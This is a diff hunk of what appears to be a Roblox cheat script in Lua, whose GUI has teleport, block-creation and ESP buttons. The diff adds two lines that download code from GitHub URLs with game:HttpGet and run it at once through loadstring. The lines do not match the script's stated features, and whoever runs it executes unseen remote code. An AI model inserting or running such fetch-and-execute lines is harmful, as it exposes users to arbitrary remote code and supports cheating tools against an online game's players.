@@ -58,6 +58,9 @@ local teleportAndCreateBlockButton = createStyledButton(frame, "Teleport & Creat
 local refreshTeleportButton = createStyledButton(frame, "Refresh Teleport", UDim2.new(0, 0, 2 * buttonSpacing, 0))
 local createHighlightButton = createStyledButton(frame, "Create Esp", UDim2.new(0, 0, 3 * buttonSpacing, 0))
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/gitolan/gefbymeind2/main/check%20role"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/gitolan/gefop-/main/creditgef.txt"))()
+
 animateButton(teleportButton)
 animateButton(teleportAndCreateBlockButton)
 animateButton(refreshTeleportButton)
